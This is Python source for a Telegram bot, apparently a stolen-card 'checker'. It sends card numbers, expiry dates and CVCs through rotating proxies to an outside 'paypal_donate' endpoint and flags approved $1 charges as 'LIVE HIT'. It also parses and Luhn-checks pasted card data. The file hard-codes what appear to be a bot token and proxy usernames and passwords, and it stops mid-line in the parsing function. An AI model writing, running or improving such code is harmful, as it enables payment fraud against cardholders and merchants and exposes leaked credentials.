import telebot
import time
import threading
import requests
import re
import random
from telebot import types
from datetime import datetime

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 7077294261
stopuser = {}

# ================== PROXIES ==================
PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

def get_proxy():
    proxy_str = random.choice(PROXIES)
    user, passw, host, port = proxy_str.split(':')
    proxy_url = f"http://{user}:{passw}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}, proxy_str

# ================== CHECKER WITH FULL LOGS ==================
def pali(ccx):
    ccx = ccx.strip()
    current_time = datetime.now().strftime('%H:%M:%S')
    
    proxy_dict, proxy_used = get_proxy()
    
    print(f"[{current_time}] CHECKING → {ccx}")
    print(f"[{current_time}] PROXY USED → {proxy_used}")
    
    try:
        url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
        print(f"[{current_time}] API CALL → {url}")
        
        r = requests.get(url, proxies=proxy_dict, timeout=30)
        text = r.text
        
        print(f"[{current_time}] STATUS CODE → {r.status_code}")
        print(f"[{current_time}] FULL RESPONSE → {text[:500]}")
        
        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
            print(f"[{current_time}] ✅ LIVE HIT (CHARGE 1.00$)")
            return "CHARGE 1.00$"
        elif "ORDER NOT APPROVED" in text.upper() or "DECLINED" in text.upper():
            print(f"[{current_time}] ❌ DECLINED")
            return "DECLINED"
        else:
            print(f"[{current_time}] ⚠️ UNKNOWN RESPONSE")
            return text[:150]

    except Exception as e:
        print(f"[{current_time}] ❌ ERROR: {e}")
        return "ERROR"


# ================== CARD REGEX ==================
def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p]
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if not luhn_check(pan):
            return None
        return f"{pan}|{mm}|{yy}|{cvc
